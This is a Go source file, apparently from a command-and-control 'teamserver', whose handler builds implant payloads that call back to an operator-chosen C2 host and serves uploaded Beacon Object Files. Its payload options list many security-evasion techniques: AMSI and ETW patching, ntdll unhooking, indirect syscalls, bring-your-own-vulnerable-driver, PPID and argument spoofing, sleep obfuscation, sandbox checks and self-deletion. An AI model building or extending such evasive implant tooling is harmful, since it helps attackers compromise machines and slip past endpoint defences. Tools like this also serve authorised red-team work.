package api

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	"github.com/rs/zerolog/log"
	"gopkg.in/yaml.v3"

	"apex/teamserver/internal/builder"
	"apex/teamserver/internal/listeners"
)

// PayloadHandler builds and serves agent payloads and manages BOF storage.
type PayloadHandler struct {
	listeners *listeners.Manager
	agentDir  string
	bofDir    string
	bofMu     sync.RWMutex
	bofs      []BOFEntry
}

type BOFEntry struct {
	ID         string `json:"id"`
	Name       string `json:"name"`
	Size       int64  `json:"size"`
	Hash       string `json:"hash"`
	UploadedAt string `json:"uploaded_at"`
	FilePath   string `json:"-"`
}

func NewPayloadHandler(mgr *listeners.Manager, agentDir string) *PayloadHandler {
	if agentDir == "" {
		agentDir = "agent"
	}

	bofDir := filepath.Join(agentDir, "..", "data", "bofs")
	os.MkdirAll(bofDir, 0755)

	h := &PayloadHandler{
		listeners: mgr,
		agentDir:  agentDir,
		bofDir:    bofDir,
		bofs:      make([]BOFEntry, 0),
	}

	h.loadExistingBOFs()
	return h
}

func (h *PayloadHandler) loadExistingBOFs() {
	entries, err := os.ReadDir(h.bofDir)
	if err != nil {
		return
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		ext := strings.ToLower(filepath.Ext(e.Name()))
		if ext != ".o" && ext != ".obj" {
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		h.bofs = append(h.bofs, BOFEntry{
			ID:         uuid.New().String(),
			Name:       e.Name(),
			Size:       info.Size(),
			UploadedAt: info.ModTime().Format(time.RFC3339),
			FilePath:   filepath.Join(h.bofDir, e.Name()),
		})
	}
	log.Info().Int("count", len(h.bofs)).Msg("Loaded existing BOFs")
}

// profileYAML mirrors the relevant fields of a malleable profile YAML file.
type profileYAML struct {
	UserAgents []string `yaml:"user_agents"`
	HTTP       struct {
		Post struct {
			URI []string `yaml:"uri"`
		} `yaml:"post"`
	} `yaml:"http"`
}

// loadProfile reads a malleable profile YAML and returns compile-time options.
// Returns nil (not an error) when profileName is empty or the file is missing,
// so builds fall back to the agent defaults.
func loadProfile(profileName, agentDir string) *builder.ProfileOpts {
	if profileName == "" {
		return nil
	}
	// Profiles live in a sibling "profiles" directory next to the agent source.
	profileDir := filepath.Join(agentDir, "..", "profiles")
	data, err := os.ReadFile(filepath.Join(profileDir, profileName+".yaml"))
	if err != nil {
		log.Warn().Err(err).Str("profile", profileName).Msg("Could not load profile, using defaults")
		return nil
	}
	var p profileYAML
	if err := yaml.Unmarshal(data, &p); err != nil {
		log.Warn().Err(err).Str("profile", profileName).Msg("Could not parse profile YAML, using defaults")
		return nil
	}
	opts := &builder.ProfileOpts{}
	if len(p.UserAgents) > 0 {
		opts.UserAgent = p.UserAgents[0]
	}
	if len(p.HTTP.Post.URI) > 0 {
		opts.URI = p.HTTP.Post.URI[0]
	}
	return opts
}

// GenerateRequest mirrors the client's payload configuration.
type GenerateRequest struct {
	Platform           string   `json:"platform"` // "windows" | "linux" | "macos"
	OutputFormat       string   `json:"output_format"`
	ListenerID         string   `json:"listener_id"`
	CallbackHost       string   `json:"callback_host"`
	CallbackPort       int      `json:"callback_port"`
	ProfileName        string   `json:"profile_name"`
	// Windows evasion
	SleepObfuscation   bool     `json:"sleep_obfuscation"`
	SleepMethod        string   `json:"sleep_method"`
	EncryptedShellcode bool     `json:"encrypted_shellcode"`
	EncryptionMethod   string   `json:"encryption_method"`
	UnhookNtdll        bool     `json:"unhook_ntdll"`
	ETWPatch           bool     `json:"etw_patch"`
	AMSIPatch          bool     `json:"amsi_patch"`
	HardwareBreakpoint bool     `json:"hardware_breakpoint"`
	BYOVD              bool     `json:"byovd"`
	IndirectSyscall    bool     `json:"indirect_syscall"`
	SyscallMethod      string   `json:"syscall_method"`
	NtProcess          bool     `json:"nt_process"`   // Issue #7
	HeapEncrypt        bool     `json:"heap_encrypt"` // Issue #4
	PeStomp            bool     `json:"pe_stomp"`
	PeStompMode        int      `json:"pe_stomp_mode"`
	PeStompRandomise   bool     `json:"pe_stomp_randomise"`
	UDRL               bool     `json:"udrl"`
	DripLoad           bool     `json:"drip_load"`
	RetAddrSpoof       bool     `json:"ret_addr_spoof"`
	SyntheticFrames    bool     `json:"synthetic_frames"`
	BlockDLLs          bool     `json:"block_dlls"`
	ArgSpoof           bool     `json:"arg_spoof"`
	PPIDSpoof          bool     `json:"ppid_spoof"`
	BOFIDs             []string `json:"bof_ids"`
	// POSIX evasion (Linux/macOS)
	AntiDebug    bool `json:"anti_debug"`
	ProcMask     bool `json:"proc_mask"`
	SelfDelete   bool `json:"self_delete"`
	EnvClean     bool `json:"env_clean"`
	SandboxCheck bool `json:"sandbox_check"`
}

type GenerateResponse struct {
	Success       bool   `json:"success"`
	Message       string `json:"message"`
	PayloadBase64 string `json:"payload_base64,omitempty"`
	Filename      string `json:"filename,omitempty"`
}

func (h *PayloadHandler) Generate(w http.ResponseWriter, r *http.Request) {
	var req GenerateRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	if req.ListenerID == "" {
		writeError(w, http.StatusBadRequest, "listener_id required")
		return
	}

	l, ok := h.listeners.Get(req.ListenerID)
	if !ok {
		writeError(w, http.StatusNotFound, "listener not found")
		return
	}

	c2Host := strings.TrimSpace(req.CallbackHost)
	if c2Host == "" {
		c2Host = l.BindAddress()
		if c2Host == "" || c2Host == "0.0.0.0" {
			c2Host = "127.0.0.1"
		}
	}
	c2Port := req.CallbackPort
	if c2Port <= 0 {
		c2Port = l.BindPort()
	}
	if c2Port <= 0 {
		c2Port = 8080
	}
	useHTTPS := l.Protocol() == listeners.ProtocolHTTPS || l.Protocol() == listeners.ProtocolMTLS
	useMTLS := l.Protocol() == listeners.ProtocolMTLS

	platform := builder.Platform(strings.ToLower(req.Platform))
	if platform == "" {
		platform = builder.PlatformWindows
	}

	// Map sleep_method string → int (0=plain, 1=Ekko, 2=Foliage)
	sleepMethodInt := 1 // default: Ekko
	if !req.SleepObfuscation {
		sleepMethodInt = 0 // obfuscation disabled → plain sleep
	} else {
		switch strings.ToLower(req.SleepMethod) {
		case "foliage":
			sleepMethodInt = 2
		case "none", "plain", "0":
			sleepMethodInt = 0
		default: // "ekko" or anything else
			sleepMethodInt = 1
		}
	}

	evasion := &builder.EvasionOpts{
		SleepObfuscation: req.SleepObfuscation,
		SleepMethod:      sleepMethodInt,
		UnhookNtdll:      req.UnhookNtdll,
		ETWPatch:         req.ETWPatch,
		AMSIPatch:        req.AMSIPatch,
		IndirectSyscall:  req.IndirectSyscall,
		SyscallMethod:    req.SyscallMethod,
		NtProcess:        req.NtProcess,
		HeapEncrypt:      req.HeapEncrypt,
		PeStomp:          req.PeStomp,
		PeStompMode:      req.PeStompMode,
		PeStompRandomise: req.PeStompRandomise,
		UDRL:             req.UDRL,
		DripLoad:         req.DripLoad,
		RetAddrSpoof:     req.RetAddrSpoof,
		SyntheticFrames:  req.SyntheticFrames,
		BlockDLLs:        req.BlockDLLs,
		ArgSpoof:         req.ArgSpoof,
		PPIDSpoof:        req.PPIDSpoof,
	}

	posixEvasion := &builder.PosixEvasionOpts{
		AntiDebug:    req.AntiDebug,
		ProcMask:     req.ProcMask,
		SelfDelete:   req.SelfDelete,
		EnvClean:     req.EnvClean,
		SandboxCheck: req.SandboxCheck,
	}

	profile := loadProfile(req.ProfileName, h.agentDir)

	log.Info().
		Str("platform", string(platform)).
		Str("format", req.OutputFormat).
		Str("profile", req.ProfileName).
		Msg("Building agent payload")

	b64, filename, err := builder.BuildBase64(h.agentDir, platform, req.OutputFormat, c2Host, c2Port, useHTTPS, useMTLS, evasion, posixEvasion, profile)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "build failed: "+err.Error())
		return
	}

	writeJSON(w, http.StatusOK, GenerateResponse{
		Success:       true,
		Message:       "Payload built successfully",
		PayloadBase64: b64,
		Filename:      filename,
	})
}

// BOF management

func (h *PayloadHandler) ListBOFs(w http.ResponseWriter, _ *http.Request) {
	h.bofMu.RLock()
	defer h.bofMu.RUnlock()
	writeJSON(w, http.StatusOK, h.bofs)
}

func (h *PayloadHandler) UploadBOF(w http.ResponseWriter, r *http.Request) {
	if err := r.ParseMultipartForm(10 << 20); err != nil {
		writeError(w, http.StatusBadRequest, "invalid multipart form")
		return
	}

	file, header, err := r.FormFile("bof")
	if err != nil {
		writeError(w, http.StatusBadRequest, "missing 'bof' file field")
		return
	}
	defer file.Close()

	ext := strings.ToLower(filepath.Ext(header.Filename))
	if ext != ".o" && ext != ".obj" {
		writeError(w, http.StatusBadRequest, "only .o or .obj files accepted")
		return
	}

	data, err := io.ReadAll(io.LimitReader(file, 10<<20))
	if err != nil {
		writeError(w, http.StatusInternalServerError, "read failed")
		return
	}

	hash := fmt.Sprintf("%x", sha256.Sum256(data))
	id := uuid.New().String()
	savePath := filepath.Join(h.bofDir, id+ext)
	if err := os.WriteFile(savePath, data, 0644); err != nil {
		writeError(w, http.StatusInternalServerError, "save failed: "+err.Error())
		return
	}

	entry := BOFEntry{
		ID:         id,
		Name:       header.Filename,
		Size:       int64(len(data)),
		Hash:       hash[:16],
		UploadedAt: time.Now().Format(time.RFC3339),
		FilePath:   savePath,
	}

	h.bofMu.Lock()
	h.bofs = append(h.bofs, entry)
	h.bofMu.Unlock()

	log.Info().Str("id", id).Str("name", header.Filename).Int("size", len(data)).Msg("BOF uploaded")
	writeJSON(w, http.StatusOK, entry)
}

func (h *PayloadHandler) GetBOFData(id string) ([]byte, error) {
	h.bofMu.RLock()
	defer h.bofMu.RUnlock()
	for _, b := range h.bofs {
		if b.ID == id {
			return os.ReadFile(b.FilePath)
		}
	}
	return nil, fmt.Errorf("BOF not found: %s", id)
}

func (h *PayloadHandler) ServeBOFData(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	data, err := h.GetBOFData(id)
	if err != nil {
		writeError(w, http.StatusNotFound, err.Error())
		return
	}
	b64 := base64.StdEncoding.EncodeToString(data)
	writeJSON(w, http.StatusOK, map[string]string{"data": b64})
}

func (h *PayloadHandler) DeleteBOF(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing id")
		return
	}

	h.bofMu.Lock()
	defer h.bofMu.Unlock()
	for i, b := range h.bofs {
		if b.ID == id {
			os.Remove(b.FilePath)
			h.bofs = append(h.bofs[:i], h.bofs[i+1:]...)
			writeJSON(w, http.StatusOK, map[string]string{"status": "deleted"})
			return
		}
	}
	writeError(w, http.StatusNotFound, "BOF not found")
}
